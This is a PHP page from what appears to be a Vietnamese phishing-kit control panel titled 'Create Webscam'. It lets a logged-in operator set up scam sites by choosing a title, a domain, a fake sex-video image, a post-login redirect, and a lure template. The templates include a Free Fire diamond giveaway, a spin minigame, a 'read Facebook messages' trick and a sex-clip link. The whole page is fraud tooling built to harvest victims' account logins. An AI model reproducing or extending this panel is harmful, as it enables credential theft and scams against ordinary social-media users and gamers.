<?php include('Theme/Header.php'); ?>





<?php include 'ReLoad/Create-Web.php'; ?>



		
		<?php
		
		
include 'Client/Database/Config.php';

if(isset($_POST['submit'])){

   $tieude = mysqli_real_escape_string($conn, $_POST['tieude']);
   $domain = mysqli_real_escape_string($conn, $_POST['domain']);
    $giaodien = mysqli_real_escape_string($conn, $_POST['giaodien']);
      $video = mysqli_real_escape_string($conn, $_POST['videosex']);
      $trangcuoi = mysqli_real_escape_string($conn, $_POST['trangcuoi']);
    $uid = mysqli_real_escape_string($conn, $_POST['uid']);
 
if($tieude == "" || $domain == "" || $giaodien == ""){
$message[] = ' Vui Lòng Nhập Đầy Đủ Thông Tin ! '; 
} 

else{
	    
		}

   $select = mysqli_query($conn, "SELECT * FROM `web` WHERE id = '1'") or die(' Con Mẹ Nó Lỗi Rồi !!!!! ');

   if(mysqli_num_rows($select) > 0){
      $message[] = ' Bạn Chỉ Có Thể Tạo 1 Giao Diện 1 Lần ! '; 
      }else{
         $insert = mysqli_query($conn, "INSERT INTO `web`(tieude, domain, uid, giaodien, trangcuoi, videosex) VALUES('$tieude', '$domain', '$uid', '$giaodien', '$trangcuoi', '$video')") or die(' Tạo Trang Web Thành Công ! ');
echo '   <meta http-equiv="refresh" content="0;URL=/Create-Web">';


   }

}

?>


					<?php
					if(isset($_SESSION['user_id'])){
						?>
    
    
    

<div class="main_content_iner overly_inner ">
<div class="container-fluid p-0 ">

<div class="row">
<div class="col-12">
<div class="page_title_box d-flex flex-wrap align-items-center justify-content-between">
<div class="page_title_left d-flex align-items-center">
<h3 class="f_s_25 f_w_700 dark_text mr_30"> Create Webscam </h3>
<ol class="breadcrumb page_bradcam mb-0">
<li class="breadcrumb-item"><a href="javascript:void(0);">Home</a></li>
<li class="breadcrumb-item active">Create</li>
</ol>
</div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-12">
<div class="white_card card_height_100 mb_30">
<div class="white_card_header">
<div class="box_header m-0">
<div class="main-title">
<h3 class="m-0"> Create My Web Scam </h3>
<p> Up Ảnh <a href="//upanh.cf" class="m-0 text-danger">Tại Đây </a></p>
<center>   
		<b class="text-danger">	<?php
      if(isset($message)){
         foreach($message as $message){
            echo '<div class="message">'.$message.'</div>';
         }
      }
      ?>
</b> </center>

</div>
</div>
</div>
<div class="white_card_body">
<div class="row">
    
    	<form action="" method="post" enctype="multipart/form-data" class="form w-100" novalidate="novalidate">

<input type="hidden" value="<?php echo $user_id; ?>" name="uid">

<div class="col-lg-6">
<div class="common_input mb_15">
<input type="text" name="tieude" placeholder=" Tiêu Đề Web ">
</div>
</div>


<div class="col-lg-6">
<div class="common_input mb_15">
<input type="text" name="videosex" value="" placeholder=" Link Ảnh Giả Video Cho Web Scam Sex  ">
</div>
</div>


<div class="col-lg-6">
<div class="common_input mb_15">
<input type="text" name="trangcuoi" placeholder=" Trang Chuyển Hướng Lúc Người Dùng Đã Đăng Nhập ">
</div>
</div>

<div class="col-lg-6">
<select class="nice_Select2 nice_Select_line wide mb_15" name="domain">
<option value="<?php echo $_SERVER['HTTP_HOST']; ?>"> Tên Miền Mặc Định (<?php echo $_SERVER['HTTP_HOST']; ?>)</option>

	<?php
		$result = mysqli_query($conn, "SELECT * FROM domain");
		while($row = mysqli_fetch_assoc($result)){
			?>

<option value="<?php echo $row['domain']; ?>"> <?php echo $row['domain']; ?> </option>
<?php } ?>

</select>



</div>


</div>


<div class="col-lg-6">
<select class="nice_Select2 nice_Select_line wide mb_15" name="giaodien">
<option value=""> Chọn Giao Diện (Free Tại <?php echo $_SERVER['HTTP_HOST']; ?> ) </option>
<option value="Vong-Quay-Mang-Xa?MiniGame="> Scam Vòng Quay Mãng Xà </option>
<option value="Qua-Mien-Phi?MiniGame="> Nhận Kim Cương Free Fire </option>
<option value="Doc-Trom?DocTrom=">  Scam Dạng Đọc Trộm Tin Nhắn Facebook </option>
<option value="Clip-Sex-Nong-Hot-Nhat?ClipSex_ID="> Mẫu Scam Link Sex </option>
</select>

</div>

<div class="col-12">
<div class="create_report_btn mt_30">
    <input type="submit" name="submit" class="btn_1 radius_btn d-block text-center mt_30" value="Tạo Ngay"> 
    
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

    
<?php

} else
{
?>


					   <meta http-equiv="refresh" content="0;URL=/Auth/Login">	



<?php 
}
?>
<?php include('Theme/Footer.php'); ?>